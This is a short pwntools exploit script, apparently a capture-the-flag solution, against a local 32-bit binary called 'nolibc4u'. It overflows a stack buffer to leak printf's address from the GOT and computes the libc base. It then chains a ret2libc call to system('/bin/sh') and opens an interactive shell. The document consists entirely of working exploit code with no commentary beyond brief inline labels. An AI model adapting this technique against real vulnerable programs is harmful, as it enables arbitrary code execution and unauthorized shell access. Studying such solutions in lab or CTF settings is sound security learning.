

from pwn import *

buf = ""
buf += "A"*76
buf += p32(0x08048300)       # printf@plt
buf += p32(0x0804843b)       # printf ret to vuln()
buf += p32(0x0804851a)       # "%s\n"
buf += p32(0x0804a00c)       # printf@got

sh = process("./nolibc4u")
sh.sendline(buf)
print sh.recvline()
addr_printf = sh.recvline()
addr_printf = u32(addr_printf[:4])

e = ELF('/lib/i386-linux-gnu/libc.so.6') # ldd nolibc4u

off_system = e.symbols['system']		#offset of system
off_exit = e.symbols['exit']			#offset of exit
off_printf = e.symbols['printf']		#Offset of printf
off_binsh = e.search("/bin/sh").next()	#offset of /bin/sh

libc_base = addr_printf - off_printf

system_addr = libc_base + off_system
exit_addr = libc_base + off_exit
binsh_addr = libc_base + off_binsh

buf = ""
buf += "A"*76	# junk
buf += p32(system_addr)	# system address
buf += p32(exit_addr)	# exit address
buf += p32(binsh_addr)	# /bin/sh address

sh.sendline(buf)
sh.interactive()
sh.close()




